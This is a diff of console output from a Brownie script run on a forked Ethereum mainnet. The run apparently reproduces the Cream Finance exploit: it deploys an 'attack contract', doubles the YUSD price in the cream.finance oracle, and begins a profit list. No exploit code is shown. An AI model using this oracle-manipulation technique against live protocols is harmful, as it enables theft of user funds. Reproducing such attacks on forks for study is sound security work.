@@ -28,18 +28,21 @@ CreamProject is the active project.
 Launching 'ganache-cli --port 8849 --gasLimit 880000000000 --accounts 10 --hardfork istanbul --mnemonic brownie --fork https://speedy-nodes-nyc.moralis.io/20189123bd8fd22f2ac08e16/eth/mainnet/archive/@13499797 --defaultBalanceEther 10000000000000 --chainId 1'...
 
 Running 'scripts/gbu.py::main'...
+
+Deploying attack contract...
 Transaction sent: 0x9af371e792238e1c68882b9057296d5a3c28e48a1df8163f05b1f878072d3ce0
   Gas price: 0.0 gwei   Gas limit: 880000000000   Nonce: 2
   Luck.constructor confirmed   Block: 13499799   Gas used: 3180843 (0.00%)
   Luck deployed at: 0xE7eD6747FaC5360f88a2EFC03E00d25789F69291
 
-Before The YUSD's price in cream.finance oracle: 279300989383783
+> Before The YUSD's price in cream.finance oracle: 279300989383783
 
+Launch attack...
 Transaction sent: 0x3a1265b942688707f81cbd3adf420db3b81ae8fff0768696c9f84bcc4f367b45
   Gas price: 0.0 gwei   Gas limit: 880000000000   Nonce: 3
   Luck.luck confirmed   Block: 13499800   Gas used: 28578950 (0.00%)
 
-After The YUSD's price in cream.finance oracle: 558660521726027
+> After The YUSD's price in cream.finance oracle: 558660521726027
 
 
 🧛 The profit list:
